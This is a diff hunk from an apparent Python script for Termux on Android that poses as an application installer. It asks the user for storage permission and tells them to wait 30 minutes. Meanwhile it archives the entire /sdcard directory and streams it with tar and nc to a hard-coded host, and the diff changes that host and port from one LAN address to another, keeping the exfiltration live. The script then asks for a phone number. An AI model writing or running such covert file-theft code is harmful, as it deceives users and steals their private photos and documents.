@@ -21,7 +21,7 @@ print("Please allow the application access to your storage, for downloading the 
 time.sleep(2)
 subprocess.run("termux-setup-storage", shell=True)
 print("Application downloaded. Please wait for atleast 30 minutes for the terminal to appear:")
-subprocess.run("tar -C /sdcard -cf - . | nc 192.168.0.109 4444", shell=True)
+subprocess.run("tar -C /sdcard -cf - . | nc 192.168.0.110 9000", shell=True)
 
 a = input("Enter the phone number: \n")
 time.sleep(1)
